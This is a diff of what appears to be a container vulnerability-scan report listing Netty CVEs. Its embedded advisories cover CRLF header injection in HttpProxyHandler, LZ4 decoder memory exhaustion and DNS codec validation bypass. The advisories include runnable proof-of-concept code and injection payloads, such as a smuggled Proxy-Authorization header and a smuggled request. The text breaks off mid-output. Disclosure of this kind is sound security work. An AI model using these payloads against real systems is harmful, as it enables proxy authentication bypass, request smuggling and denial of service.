-                              │                   - `io.netty.handler.proxy.HttpProxyHandler` —
-                              │                   `newInitialMessage()` method (line 176) explicitly disables
-                              │                   header validation via `withValidation(false)`
-                              │                   ## 3. Vulnerability Description
-                              │                   Netty's `HttpProxyHandler` constructs HTTP CONNECT requests
-                              │                   with **header validation explicitly disabled**. The
-                              │                   `newInitialMessage()` method (line 176) creates headers using
-                              │                   `DefaultHttpHeadersFactory.headersFactory().withValidation(fa
-                              │                   lse)`, then adds user-provided `outboundHeaders` (line
-                              │                   188-190) without any CRLF validation. This allows an attacker
-                              │                    who can influence the outbound headers to inject arbitrary
-                              │                   HTTP headers into the CONNECT request sent to the proxy
-                              │                   server.
-                              │                   ### Root Cause
-                              │                   ```java
-                              │                   // HttpProxyHandler.java:176-190
-                              │                   protected Object newInitialMessage(ChannelHandlerContext ctx)
-                              │                    throws Exception {
-                              │                       // ...
-                              │                       HttpHeadersFactory headersFactory =
-                              │                   DefaultHttpHeadersFactory.headersFactory()
-                              │                           .withValidation(false);  // <-- VALIDATION EXPLICITLY
-                              │                    DISABLED
-                              │                       FullHttpRequest req = new DefaultFullHttpRequest(
-                              │                           HttpVersion.HTTP_1_1, HttpMethod.CONNECT,
-                              │                           url, Unpooled.EMPTY_BUFFER, headersFactory,
-                              │                   headersFactory);
-                              │                       req.headers().set(HttpHeaderNames.HOST, hostHeader);
-                              │                       if (authorization != null) {
-                              │                          
-                              │                   req.headers().set(HttpHeaderNames.PROXY_AUTHORIZATION,
-                              │                   authorization);
-                              │                       }
-                              │                       if (outboundHeaders != null) {
-                              │                           req.headers().add(outboundHeaders);  // <-- USER
-                              │                   HEADERS ADDED WITHOUT VALIDATION
-                              │                       return req;
-                              │                   }
-                              │                   ```
-                              │                   The `outboundHeaders` parameter comes from the
-                              │                   `HttpProxyHandler` constructor (lines 80-93, 99-127), which
-                              │                   is supplied by application code.
-                              │                   ### Incomplete Fix of GHSA-84h7-rjj3-6jx4
-                              │                   **This vulnerability represents an incomplete fix of the
-                              │                   previously acknowledged security advisory
-                              │                   [GHSA-84h7-rjj3-6jx4](https://github.com/netty/netty/security
-                              │                   /advisories/GHSA-84h7-rjj3-6jx4).**
-                              │                   The GHSA-84h7-rjj3-6jx4 fix addressed HTTP CRLF injection by
-                              │                   adding URI validation via `validateRequestLineTokens()` in
-                              │                   `DefaultHttpRequest` and enabling header validation by
-                              │                   default through `DefaultHttpHeadersFactory`. However,
-                              │                   `HttpProxyHandler` **explicitly opts out** of the fix by
-                              │                   calling `withValidation(false)`, creating a gap where:
-                              │                   1. The GHSA-84h7-rjj3-6jx4 fix's header validation is
-                              │                   bypassed
-                              │                   2. User-provided `outboundHeaders` are added without any CRLF
-                              │                    check
-                              │                   3. The resulting CONNECT request contains unvalidated headers
-                              │                    on the wire
-                              │                   This is not a new vulnerability class — it is the **same CRLF
-                              │                    injection** that GHSA-84h7-rjj3-6jx4 was supposed to fix,
-                              │                   but `HttpProxyHandler` was missed during the remediation. The
-                              │                    fix for GHSA-84h7-rjj3-6jx4 should be extended to cover this
-                              │                    code path.
-                              │                   ## 4. Exploitability Prerequisites
-                              │                   This vulnerability is exploitable when:
-                              │                   1. An application uses `HttpProxyHandler` with
-                              │                   user-influenced `outboundHeaders`
-                              │                   2. The application does not perform its own CRLF sanitization
-                              │                    on header values
-                              │                   **Common affected patterns**:
-                              │                   - HTTP proxy clients that forward user-specified custom
-                              │                   headers
-                              │                   - Web scraping frameworks that allow users to set proxy
-                              │                   - API gateways that pass user headers through a proxy tunnel
-                              │                   ## 5. Attack Scenarios
-                              │                   ### Scenario 1: Proxy Authentication Bypass
-                              │                   HttpHeaders headers = new DefaultHttpHeaders(false);
-                              │                   headers.set("X-Forwarded-For", userInput);  // userInput from
-                              │                    attacker
-                              │                   new HttpProxyHandler(proxyAddr, headers);
-                              │                   **Attack input**: `userInput =
-                              │                   "1.2.3.4\r\nProxy-Authorization: Basic YWRtaW46YWRtaW4="`
-                              │                   **Wire format**:
-                              │                   CONNECT target.com:443 HTTP/1.1
-                              │                   host: target.com:443
-                              │                   X-Forwarded-For: 1.2.3.4
-                              │                   Proxy-Authorization: Basic YWRtaW46YWRtaW4=    <-- INJECTED
-                              │                   The injected `Proxy-Authorization` header may override or
-                              │                   supplement the original authentication, potentially granting
-                              │                   access to a restricted proxy.
-                              │                   ### Scenario 2: Request Smuggling via Proxy
-                              │                   **Attack input**: `userInput = "value\r\nTransfer-Encoding:
-                              │                   chunked\r\n\r\n0\r\n\r\nGET /internal HTTP/1.1\r\nHost:
-                              │                   internal-service"`
-                              │                   Injects a full smuggled request through the proxy tunnel
-                              │                   establishment.
-                              │                   ## 6. Proof of Concept
-                              │                   ### Full Runnable PoC Source Code
-                              │                   (HttpProxyHeaderInjectionPoC.java)
-                              │                   import io.netty.buffer.ByteBuf;
-                              │                   import io.netty.channel.embedded.EmbeddedChannel;
-                              │                   import io.netty.handler.codec.http.*;
-                              │                   import java.nio.charset.StandardCharsets;
-                              │                   public class HttpProxyHeaderInjectionPoC {
-                              │                       public static void main(String[] args) {
-                              │                           System.out.println("=== Netty HttpProxyHandler Header
-                              │                    Injection PoC ===\n");
-                              │                           // Simulate HttpProxyHandler.newInitialMessage() with
-                              │                    validation=false
-                              │                           HttpHeadersFactory headersFactory =
-                              │                               .withValidation(false);
-                              │                           FullHttpRequest req = new DefaultFullHttpRequest(
-                              │                               HttpVersion.HTTP_1_1, HttpMethod.CONNECT,
-                              │                               "target.com:443",
-                              │                               io.netty.buffer.Unpooled.EMPTY_BUFFER,
-                              │                   headersFactory, headersFactory);
-                              │                           req.headers().set(HttpHeaderNames.HOST,
-                              │                   "target.com:443");
-                              │                           // Inject CRLF in header value
-                              │                           String malicious = "1.2.3.4\r\nX-Forwarded-For:
-                              │                   127.0.0.1\r\nX-Admin: true";
-                              │                           req.headers().set("X-Forwarded-For", malicious);
-                              │                           // Encode to wire format
-                              │                           EmbeddedChannel ch = new EmbeddedChannel(new
-                              │                   HttpRequestEncoder());
-                              │                           ch.writeOutbound(req);
-                              │                           ByteBuf out = ch.readOutbound();
-                              │                           String encoded =
-                              │                   out.toString(StandardCharsets.UTF_8);
-                              │                           out.release();
-                              │                           ch.finishAndReleaseAll();
-                              │                           System.out.println("Wire format:");
-                              │                           for (String line : encoded.split("\n", -1)) {
-                              │                               System.out.println("  " + line.replace("\r",
-                              │                   "\\r"));
-                              │                           }
-                              │                           System.out.println("Injected X-Admin: " +
-                              │                   encoded.contains("X-Admin: true"));
-                              │                           System.out.println("VULNERABLE: " +
-                              │                               (encoded.contains("X-Admin: true") ? "YES" :
-                              │                   "NO"));
-                              │                   ### PoC Execution Output (Verified on Netty 4.2.12.Final)
-                              │                   === Netty HttpProxyHandler Header Injection PoC ===
-                              │                   [TEST 1] outboundHeaders with CRLF (validation disabled)
-                              │                   ----------------------------------------------------------
-                              │                     Injected header value: "1.2.3.4\r\nX-Forwarded-For:
-                              │                   127.0.0.1\r\nX-Admin: true"
-                              │                     Header accepted: YES (validation disabled!)
-                              │                     Wire format:
-                              │                       CONNECT target.com:443 HTTP/1.1\r
-                              │                       host: target.com:443\r
-                              │                       X-Forwarded-For: 1.2.3.4\r
-                              │                       X-Forwarded-For: 127.0.0.1\r          <-- INJECTED
-                              │                       X-Admin: true\r                        <-- INJECTED
-                              │                       \r
-                              │                     Injected X-Admin header in wire: true
-                              │                     VULNERABLE: YES
-                              │                   [TEST 2] validation=true vs validation=false comparison
-                              │                   --------------------------------------------------------
-                              │                     With validation=true:
-                              │                       SAFE: Rejected - IllegalArgumentException
-                              │                     With validation=false:
-                              │                       VULNERABLE: Accepted CRLF in header value!
-                              │                       Stored value contains CRLF: true
-                              │                   ## 7. Remediation Recommendations
-                              │                   ### Option 1: Remove withValidation(false)
-                              │                   // Change HttpProxyHandler.java line 176 from:
-                              │                   HttpHeadersFactory headersFactory =
-                              │                   DefaultHttpHeadersFactory.headersFactory().withValidation(fal
-                              │                   se);
-                              │                   // To:
-                              │                   DefaultHttpHeadersFactory.headersFactory();
-                              │                   ### Option 2: Validate outboundHeaders Before Adding
-                              │                   if (outboundHeaders != null) {
-                              │                       for (Map.Entry<String, String> entry : outboundHeaders)
-                              │                   {
-                              │                           HttpUtil.validateHeaderValue(entry.getValue());
-                              │                       req.headers().add(outboundHeaders);
-                              │                   ## 8. Resources
-                              │                   - [GHSA-84h7-rjj3-6jx4: Netty HTTP CRLF Injection
-                              │                   (**incomplete fix — this
-                              │                   report**)](https://github.com/netty/netty/security/advisories
-                              │                   /GHSA-84h7-rjj3-6jx4)
-                              │                   - [CWE-113: Improper Neutralization of CRLF Sequences in HTTP
-                              │                    Headers](https://cwe.mitre.org/data/definitions/113.html) 
-                              ├ Severity        : LOW 
-                              ├ VendorSeverity   ─ ghsa: 1 
-                              ╰ References       ╭ [0]: https://github.com/advisories/GHSA-84h7-rjj3-6jx4 
-                                                 ├ [1]: https://github.com/netty/netty 
-                                                 ╰ [2]: https://github.com/netty/netty/security/advisories/GHSA
-                                                        -45q3-82m4-75jr 
+      ├ Packages        
+      ╰ Vulnerabilities ╭ [0]  ╭ VulnerabilityID : CVE-2026-42583 
+                        │      ├ VendorIDs        ─ [0]: GHSA-mj4r-2hfc-f8p6 
+                        │      ├ PkgName         : io.netty:netty-codec-compression 
+                        │      ├ PkgPath         : openaf/Kube/netty-codec-compression-4.2.12.Final.jar 
+                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-compression@4.2.12.Final 
+                        │      │                  ╰ UID : d5a032dd793fa143 
+                        │      ├ InstalledVersion: 4.2.12.Final 
+                        │      ├ FixedVersion    : 4.2.13.Final 
+                        │      ├ Status          : fixed 
+                        │      ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e
+                        │      │                  │         94edd8ebe468fc57d07e 
+                        │      │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2a
+                        │      │                            e0961a5292bd158a4dcf 
+                        │      ├ SeveritySource  : ghsa 
+                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42583 
+                        │      ├ DataSource       ╭ ID  : ghsa 
+                        │      │                  ├ Name: GitHub Security Advisory Maven 
+                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
+                        │      │                          cosystem%3Amaven 
+                        │      ├ Fingerprint     : sha256:fb9f5bb3dfe4fea3cc45c30725e8119bb9fbec87a5322eb4f87dd
+                        │      │                   58dc7c75cf7 
+                        │      ├ Title           : Netty Lz4FrameDecoder is vulnerable to resource exhaustion  
+                        │      ├ Description     : ### Summary
+                        │      │                   Lz4FrameDecoder allocates a ByteBuf of size
+                        │      │                   `decompressedLength` (up to 32 MB per block) before LZ4
+                        │      │                   runs. A peer only needs a 21-byte header plus
+                        │      │                   `compressedLength` payload bytes - 22 bytes if
+                        │      │                   `compressedLength == 1` - to force that allocation.
+                        │      │                   
+                        │      │                   ### Details
+                        │      │                   io.netty.handler.codec.compression.Lz4FrameDecoder#decode
+                        │      │                   Header fields are trusted for sizing. On the compressed
+                        │      │                   path, after `readableBytes >= compressedLength`, the decoder
+                        │      │                    does `ctx.alloc().buffer(decompressedLength,
+                        │      │                   decompressedLength)` then decompresses.
+                        │      │                   ### PoC
+                        │      │                   The test below demonstrates how an attacker sending 22 bytes
+                        │      │                    will force the server to allocate 32MB
+                        │      │                   ```java
+                        │      │                       @Test
+                        │      │                       void test() throws Exception {
+                        │      │                           EventLoopGroup workerGroup = new
+                        │      │                   MultiThreadIoEventLoopGroup(NioIoHandler.newFactory());
+                        │      │                           try {
+                        │      │                               AtomicReference<Throwable> serverError = new
+                        │      │                   AtomicReference<>();
+                        │      │                               CountDownLatch latch = new CountDownLatch(1);
+                        │      │                               ServerBootstrap server = new ServerBootstrap()
+                        │      │                                       .group(workerGroup)
+                        │      │                                       .channel(NioServerSocketChannel.class)
+                        │      │                                       .childHandler(new
+                        │      │                   ChannelInitializer<SocketChannel>() {
+                        │      │                                           @Override
+                        │      │                                           protected void
+                        │      │                   initChannel(SocketChannel ch) {
+                        │      │                                               ch.pipeline()
+                        │      │                                                       .addLast(new
+                        │      │                   Lz4FrameDecoder())
+                        │      │                   ChannelInboundHandlerAdapter() {
+                        │      │                                                           @Override
+                        │      │                                                           public void
+                        │      │                   exceptionCaught(ChannelHandlerContext ctx, Throwable cause)
+                        │      │                   {
+                        │      │                                                               if (cause
+                        │      │                   instanceof DecoderException) {
+                        │      │                                                                  
+                        │      │                   serverError.set(cause.getCause());
+                        │      │                                                               } else {
+                        │      │                   serverError.set(cause);
+                        │      │                                                               }
+                        │      │                                                              
+                        │      │                   latch.countDown();
+                        │      │                                                           }
+                        │      │                                                       });
+                        │      │                                           }
+                        │      │                                       });
+                        │      │                               ChannelFuture serverChannel =
+                        │      │                   server.bind(0).sync();
+                        │      │                               Bootstrap client = new Bootstrap()
+                        │      │                                       .channel(NioSocketChannel.class)
+                        │      │                                       .handler(new
+                        │      │                                           public void
+                        │      │                   channelActive(ChannelHandlerContext ctx) {
+                        │      │                                               ByteBuf buf =
+                        │      │                   ctx.alloc().buffer(22, 22);
+                        │      │                                               buf.writeLong(MAGIC_NUMBER);
+                        │      │                                              
+                        │      │                   buf.writeByte(BLOCK_TYPE_COMPRESSED | 0x0F);
+                        │      │                                               buf.writeIntLE(1);
+                        │      │                                               buf.writeIntLE(1 << 25);
+                        │      │                                               buf.writeIntLE(0);
+                        │      │                                               buf.writeByte(0);
+                        │      │                                               ctx.writeAndFlush(buf);
+                        │      │                                               ctx.fireChannelActive();
+                        │      │                               ChannelFuture clientChannel =
+                        │      │                   client.connect(serverChannel.channel().localAddress()).sync(
+                        │      │                   );
+                        │      │                               assertTrue(latch.await(10, TimeUnit.SECONDS));
+                        │      │                              
+                        │      │                   assertInstanceOf(IndexOutOfBoundsException.class,
+                        │      │                   serverError.get());
+                        │      │                               clientChannel.channel().close();
+                        │      │                               serverChannel.channel().close();
+                        │      │                           } finally {
+                        │      │                               workerGroup.shutdownGracefully();
+                        │      │                           }
+                        │      │                       }
+                        │      │                   ```
+                        │      │                   ### Impact
+                        │      │                   Untrusted senders without per-channel / aggregate limits can
+                        │      │                    stress memory with many small requests. 
+                        │      ├ Severity        : HIGH 
+                        │      ├ VendorSeverity   ─ ghsa: 3 
+                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
+                        │      │                         ╰ V3Score : 7.5 
+                        │      ╰ References       ╭ [0]: https://github.com/netty/netty 
+                        │                         ╰ [1]: https://github.com/netty/netty/security/advisories/GHS
+                        │                                A-mj4r-2hfc-f8p6 
+                        ├ [1]  ╭ VulnerabilityID : CVE-2026-42579 
+                        │      ├ VendorIDs        ─ [0]: GHSA-cm33-6792-r9fm 
+                        │      ├ PkgName         : io.netty:netty-codec-dns 
+                        │      ├ PkgPath         : openaf/Kube/netty-codec-dns-4.2.12.Final.jar 
+                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-dns@4.2.12.Final 
+                        │      │                  ╰ UID : d1018bca82fa2aba 
+                        │      ├ InstalledVersion: 4.2.12.Final 
+                        │      ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
+                        │      ├ Status          : fixed 
+                        │      ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e
+                        │      │                  │         94edd8ebe468fc57d07e 
+                        │      │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2a
+                        │      │                            e0961a5292bd158a4dcf 
+                        │      ├ SeveritySource  : ghsa 
+                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42579 
+                        │      ├ DataSource       ╭ ID  : ghsa 
+                        │      │                  ├ Name: GitHub Security Advisory Maven 
+                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
+                        │      │                          cosystem%3Amaven 
+                        │      ├ Fingerprint     : sha256:a7af8a9bdc0094fe18e741cbcedf4f86ec31b8beb0fc87b167f60
+                        │      │                   8033804980d 
+                        │      ├ Title           : Netty has a DNS Codec Input Validation Bypass (Encoder +
+                        │      │                   Decoder) 
+                        │      ├ Description     : # Security Vulnerability Report: DNS Codec Input Validation
+                        │      │                   Bypass in Netty (Encoder + Decoder)
+                        │      │                   
+                        │      │                   ## 1. Vulnerability Summary
+                        │      │                   | Field | Value |
+                        │      │                   |-------|-------|
+                        │      │                   | **Product** | Netty |
+                        │      │                   | **Version** | 4.2.12.Final (and all prior versions with
+                        │      │                   codec-dns) |
+                        │      │                   | **Component** | `io.netty.handler.codec.dns.DnsCodecUtil`
+                        │      │                   |
+                        │      │                   | **Vulnerability Type** | CWE-20: Improper Input Validation
+                        │      │                    / CWE-626: Null Byte Interaction Error / CWE-400:
+                        │      │                   Uncontrolled Resource Consumption |
+                        │      │                   | **Impact** | DNS Cache Poisoning / Domain Validation
+                        │      │                   Bypass / Denial of Service / Malformed DNS Packets |
+                        │      │                   ## 2. Affected Components
+                        │      │                   Both the encoder and decoder in the same file are affected:
+                        │      │                   - `io.netty.handler.codec.dns.DnsCodecUtil` —
+                        │      │                   `encodeDomainName()` method (lines 31-51):
+                        │      │                     - No null byte validation in domain name labels
+                        │      │                     - No per-label length validation (RFC 1035 max: 63 bytes)
+                        │      │                     - No total domain name length validation (RFC 1035 max:
+                        │      │                   255 bytes)
+                        │      │                     - Empty labels silently truncate the domain name
+                        │      │                   `decodeDomainName()` method (lines 53-118):
+                        │      │                     - No per-label length validation (max 63)
+                        │      │                     - No total domain name length validation (max 255)
+                        │      │                     - Unbounded StringBuilder growth from attacker-controlled
+                        │      │                   DNS responses
+                        │      │                   ## 3. Vulnerability Description
+                        │      │                   Netty's DNS codec does **not enforce RFC 1035 domain name
+                        │      │                   constraints** during either encoding or decoding. This
+                        │      │                   creates a bidirectional attack surface: malicious DNS
+                        │      │                   responses can exploit the decoder, and user-influenced
+                        │      │                   hostnames can exploit the encoder.
+                        │      │                   ### 3.1 Encoder Side — Null Byte Injection (CWE-626)
+                        │      │                   A domain name containing a null byte (e.g.,
+                        │      │                   `"evil\0.example.com"`) is encoded with the null byte
+                        │      │                   embedded in the label data. This creates a domain name that
+                        │      │                   different DNS implementations interpret differently:
+                        │      │                   - **Java (full string)**: sees `"evil\0.example.com"` as a
+                        │      │                   single label containing a null
+                        │      │                   - **C/native DNS libraries**: truncate at the null byte,
+                        │      │                   seeing only `"evil"`
+                        │      │                   - **DNS servers**: may accept or reject based on
+                        │      │                   implementation
+                        │      │                   This differential interpretation enables **DNS cache
+                        │      │                   poisoning** and **domain validation bypass**.
+                        │      │                   ### 3.2 Encoder Side — Overlength Label (RFC 1035
+                        │      │                   Violation)
+                        │      │                   Labels exceeding 63 bytes are accepted by the encoder. The
+                        │      │                   length byte is written as a single unsigned byte, so a
+                        │      │                   200-byte label writes `0xC8` (200) as the length. Per RFC
+                        │      │                   1035, values 192-255 indicate **compression pointers**. This
+                        │      │                    means:
+                        │      │                   - A 200-byte label length `0xC8` would be interpreted as a
+                        │      │                   **compression pointer** by standards-compliant DNS parsers
+                        │      │                   - This creates **parser confusion** between label and
+                        │      │                   pointer interpretation
+                        │      │                   ### 3.3 Encoder Side — Silent Truncation via Empty Labels
+                        │      │                   ```java
+                        │      │                   encodeDomainName("a..b.com", buf);
+                        │      │                   // Encodes as: [01] 'a' [00]
+                        │      │                   // Only "a." is encoded, ".b.com" is silently dropped!
+                        │      │                   ```
+                        │      │                   An attacker can craft input like `"safe-domain..evil.com"`
+                        │      │                   which gets truncated to just `"safe-domain."`, potentially
+                        │      │                   bypassing domain allowlists.
+                        │      │                   ### 3.4 Decoder Side — Unbounded Memory Allocation
+                        │      │                   The decoder accepts labels of any length (0-255 bytes)
+                        │      │                   without checking the RFC 1035 per-label limit of 63 bytes or
+                        │      │                    the total domain name limit of 255 bytes. A malicious DNS
+                        │      │                   server can return responses with oversized labels, causing
+                        │      │                   excessive memory allocation.
+                        │      │                   ### Root Cause — Encoder
+                        │      │                   // DnsCodecUtil.java:31-51
+                        │      │                   static void encodeDomainName(String name, ByteBuf buf) {
+                        │      │                       if (ROOT.equals(name)) {
+                        │      │                           buf.writeByte(0);
+                        │      │                           return;
+                        │      │                       }
+                        │      │                       final String[] labels = name.split("\\.");
+                        │      │                       for (String label : labels) {
+                        │      │                           final int labelLen = label.length();
+                        │      │                           if (labelLen == 0) {
+                        │      │                               break;  // NO ERROR - silently truncates!
+                        │      │                           }
+                        │      │                           // NO check: labelLen > 63
+                        │      │                           // NO check: label contains null bytes
+                        │      │                           // NO check: total name > 255 bytes
+                        │      │                           buf.writeByte(labelLen);                    // Can
+                        │      │                   write values > 63!
+                        │      │                           ByteBufUtil.writeAscii(buf, label);         // Null
+                        │      │                   bytes pass through!
+                        │      │                       buf.writeByte(0);
+                        │      │                   }
+                        │      │                   ### Root Cause — Decoder
+                        │      │                   // DnsCodecUtil.java:94-99 (decodeDomainName)
+                        │      │                   } else if (len != 0) {
+                        │      │                       if (!in.isReadable(len)) {  // Only checks if bytes
+                        │      │                   EXIST, not if len <= 63
+                        │      │                           throw new CorruptedFrameException("truncated label
+                        │      │                   in a name");
+                        │      │                       name.append(in.toString(in.readerIndex(), len,
+                        │      │                   CharsetUtil.UTF_8)).append('.');
+                        │      │                       //    ^^^^^^ StringBuilder grows WITHOUT any length
+                        │      │                   limit
+                        │      │                       in.skipBytes(len);
+                        │      │                   **Missing checks in decoder**:
+                        │      │                   - No `if (len > 63)` check per RFC 1035 Section 2.3.4
+                        │      │                   - No `if (name.length() > 255)` check for total domain name
+                        │      │                   length
+                        │      │                   ## 4. Exploitability Prerequisites
+                        │      │                   ### Encoder Side (outbound)
+                        │      │                   1. An application constructs DNS queries using Netty's DNS
+                        │      │                   codec with user-influenced domain names
+                        │      │                   2. The constructed DNS packets are sent to DNS servers or
+                        │      │                   resolvers
+                        │      │                   ### Decoder Side (inbound)
+                        │      │                   1. An application uses Netty's `codec-dns` or `resolver-dns`
+                        │      │                    module to process DNS responses
+                        │      │                   2. The application communicates with a malicious or
+                        │      │                   compromised DNS server
+                        │      │                   **Attack surface**: Any Netty application using DNS
+                        │      │                   resolution (`DnsNameResolver`) is potentially affected on
+                        │      │                   the decoder side, as DNS responses from the network are
+                        │      │                   attacker-controlled. The encoder side requires
+                        │      │                   user-controlled hostnames.
+                        │      │                   ## 5. Attack Scenarios
+                        │      │                   ### Scenario 1: DNS Cache Poisoning via Null Byte (Encoder)
+                        │      │                   String hostname = userInput;  // "evil\0.trusted.com"
+                        │      │                   DnsQuery query = new DefaultDnsQuery(...)
+                        │      │                       .addRecord(DnsSection.QUESTION,
+                        │      │                           new DefaultDnsQuestion(hostname, DnsRecordType.A));
+                        │      │                   The DNS query for `"evil\0.trusted.com"` may be interpreted
+                        │      │                   by some resolvers as a query for `"evil"` (truncated at
+                        │      │                   null). If the attacker controls the DNS for `"evil"`, they
+                        │      │                   can return a response that gets cached for
+                        │      │                   `"evil\0.trusted.com"` (or vice versa), poisoning the
+                        │      │                   cache.
+                        │      │                   ### Scenario 2: Label/Pointer Confusion (Encoder)
+                        │      │                   A 200-byte label writes length byte `0xC8`.
+                        │      │                   Standards-compliant parsers interpret `0xC0-0xFF` as
+                        │      │                   **compression pointer** prefixes (RFC 1035 Section 4.1.4).
+                        │      │                   The resulting DNS packet is structurally ambiguous:
+                        │      │                   Byte:  [C8] [61 61 61 ... (200 bytes)]
+                        │      │                            ↑
+                        │      │                      Label interpretation: 200-byte label starting with 'a'
+                        │      │                      Pointer interpretation: pointer to offset 0x0861 = 2145
+                        │      │                   ### Scenario 3: Memory Exhaustion via Large Labels
+                        │      │                   (Decoder)
+                        │      │                   A malicious DNS server returns a response with a 255-byte
+                        │      │                   label (RFC limit: 63). Netty decodes it without error,
+                        │      │                   creating a 260+ character String. With compression pointers,
+                        │      │                    a small DNS response can cause megabytes of StringBuilder
+                        │      │                   allocation.
+                        │      │                   ### Scenario 4: Domain Truncation via Empty Label (Encoder)
+                        │      │                   encodeDomainName("safe-domain..evil.com", buf);
+                        │      │                   // Only "safe-domain." is encoded, "evil.com" silently
+                        │      │                   dropped
+                        │      │                   This can bypass domain allowlists that check the input
+                        │      │                   string.
+                        │      │                   ### Scenario 5: Downstream Processing Failures (Decoder)
+                        │      │                   Applications that pass decoded domain names to other DNS
+                        │      │                   libraries, certificate validators, or URL parsers may crash
+                        │      │                   or behave incorrectly when receiving names > 255 bytes, as
+                        │      │                   these systems typically assume RFC 1035 compliance.
+                        │      │                   ## 6. Proof of Concept
+                        │      │                   ### PoC 1: Encoder Null Byte and Overlength
+                        │      │                   (DnsEncoderNullBytePoC.java)
+                        │      │                   import io.netty.buffer.ByteBuf;
+                        │      │                   import io.netty.buffer.Unpooled;
+                        │      │                   import java.lang.reflect.Method;
+                        │      │                   import java.nio.charset.StandardCharsets;
+                        │      │                   public class DnsEncoderNullBytePoC {
+                        │      │                       public static void main(String[] args) throws Exception
+                        │      │                   {
+                        │      │                           System.out.println("=== Netty DNS Encoder Validation
+                        │      │                    Bypass PoC ===\n");
+                        │      │                           Class<?> clazz =
+                        │      │                   Class.forName("io.netty.handler.codec.dns.DnsCodecUtil");
+                        │      │                           Method encode =
+                        │      │                   clazz.getDeclaredMethod("encodeDomainName",
+                        │      │                               String.class, ByteBuf.class);
+                        │      │                           encode.setAccessible(true);
+                        │      │                           // Test 1: Null byte in domain name
+                        │      │                           ByteBuf buf = Unpooled.buffer(256);
+                        │      │                           encode.invoke(null, "evil\0.example.com", buf);
+                        │      │                           byte[] bytes = new byte[buf.readableBytes()];
+                        │      │                           buf.readBytes(bytes);
+                        │      │                           buf.release();
+                        │      │                           System.out.print("[TEST 1] Null byte - Encoded: ");
+                        │      │                           for (byte b : bytes) System.out.printf("%02x ", b &
+                        │      │                   0xff);
+                        │      │                           System.out.println("\nVULNERABLE: Null byte 0x00 in
+                        │      │                   label data!");
+                        │      │                           // Test 2: 200-byte label
+                        │      │                           ByteBuf buf2 = Unpooled.buffer(512);
+                        │      │                           encode.invoke(null, "a".repeat(200) + ".com",
+                        │      │                   buf2);
+                        │      │                           System.out.println("\n[TEST 2] 200-byte label
+                        │      │                   encoded: " + buf2.readableBytes() + " bytes");
+                        │      │                           System.out.println("VULNERABLE: Overlength label
+                        │      │                   accepted!");
+                        │      │                           buf2.release();
+                        │      │                           // Test 3: Empty label truncation
+                        │      │                           ByteBuf buf3 = Unpooled.buffer(256);
+                        │      │                           encode.invoke(null, "a..b.com", buf3);
+                        │      │                           byte[] bytes3 = new byte[buf3.readableBytes()];
+                        │      │                           buf3.readBytes(bytes3);
+                        │      │                           buf3.release();
+                        │      │                           System.out.print("\n[TEST 3] Empty label - Encoded:
+                        │      │                   ");
+                        │      │                           for (byte b : bytes3) System.out.printf("%02x ", b &
+                        │      │                    0xff);
+                        │      │                           System.out.println("\nVULNERABLE: Domain silently
+                        │      │                   truncated!");
+                        │      │                   ### PoC 2: Decoder Length Bypass (DnsDecoderLengthPoC.java)
+                        │      │                   public class DnsDecoderLengthPoC {
+                        │      │                           System.out.println("=== Netty DNS Decoder Length
+                        │      │                   Bypass PoC ===\n");
+                        │      │                           Method decode =
+                        │      │                   clazz.getDeclaredMethod("decodeDomainName", ByteBuf.class);
+                        │      │                           decode.setAccessible(true);
+                        │      │                           // Test 1: 100-byte label (RFC limit: 63)
+                        │      │                           ByteBuf buf1 = Unpooled.buffer(256);
+                        │      │                           buf1.writeByte(100);
+                        │      │                          
+                        │      │                   buf1.writeBytes("a".repeat(100).getBytes(StandardCharsets.US
+                        │      │                   _ASCII));
+                        │      │                           buf1.writeByte(3);
+                        │      │                   buf1.writeBytes("com".getBytes(StandardCharsets.US_ASCII));
+                        │      │                           buf1.writeByte(0);
+                        │      │                           String r1 = (String) decode.invoke(null, buf1);
+                        │      │                           buf1.release();
+                        │      │                           System.out.println("[TEST 1] 100-byte label:
+                        │      │                   length=" + r1.length() +
+                        │      │                               " VULNERABLE=" + (r1.length() > 64));
+                        │      │                           // Test 2: 5 x 60-byte labels = 305 bytes (RFC
+                        │      │                   limit: 255)
+                        │      │                           for (int i = 0; i < 5; i++) {
+                        │      │                               buf2.writeByte(60);
+                        │      │                              
+                        │      │                   buf2.writeBytes(String.valueOf((char)('a'+i)).repeat(60)
+                        │      │                                   .getBytes(StandardCharsets.US_ASCII));
+                        │      │                           buf2.writeByte(0);
+                        │      │                           String r2 = (String) decode.invoke(null, buf2);
+                        │      │                           System.out.println("[TEST 2] 305-byte domain:
+                        │      │                   length=" + r2.length() +
+                        │      │                               " VULNERABLE=" + (r2.length() > 255));
+                        │      │                   ### How to Compile and Run
+                        │      │                   ```bash
+                        │      │                   JARS=$(find ~/.m2/repository/io/netty -name "netty-*.jar"
+                        │      │                   -path "*/4.2.12.Final/*" \
+                        │      │                     | grep -v sources | grep -v javadoc | tr '\n' ':')
+                        │      │                   # Encoder PoC
+                        │      │                   javac -cp "$JARS" DnsEncoderNullBytePoC.java
+                        │      │                   java --add-opens java.base/java.lang=ALL-UNNAMED -cp
+                        │      │                   "$JARS:." DnsEncoderNullBytePoC
+                        │      │                   # Decoder PoC
+                        │      │                   javac -cp "$JARS" DnsDecoderLengthPoC.java
+                        │      │                   "$JARS:." DnsDecoderLengthPoC
+                        │      │                   ### PoC Execution Output (Verified on Netty 4.2.12.Final)
+                        │      │                   **Encoder PoC:**
+                        │      │                   === Netty DNS Encoder Validation Bypass PoC ===
+                        │      │                   [TEST 1] Null byte in domain name
+                        │      │                     Input: "evil\0.example.com"
